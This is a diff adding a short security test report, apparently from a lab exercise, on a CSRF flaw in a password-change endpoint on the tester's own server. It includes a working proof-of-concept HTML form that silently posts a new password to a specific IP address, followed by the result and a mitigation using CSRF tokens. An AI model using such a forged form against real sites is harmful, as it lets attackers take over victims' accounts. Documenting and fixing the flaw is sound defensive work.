@@ -1,0 +1,14 @@
+CSRF (Cross-Site Request Forgery) was tested by creating a hidden HTML form that submitted a POST request to the password change endpoint on the droplet.
+
+The form was hosted on a separate page and submitted automatically when visited.
+
+<form action="http://159.89.114.45/change-password.php" method="POST">
+  <input type="hidden" name="password" value="hacked123">
+  <input type="submit" value="Submit">
+</form>
+
+Result:
+The request was accepted by the server without requiring any authentication or CSRF token, which confirmed the CSRF vulnerability.
+
+Mitigation:
+Implement CSRF tokens in all sensitive forms and verify them server-side before processing the request. This prevents unauthorized cross-site submissions.
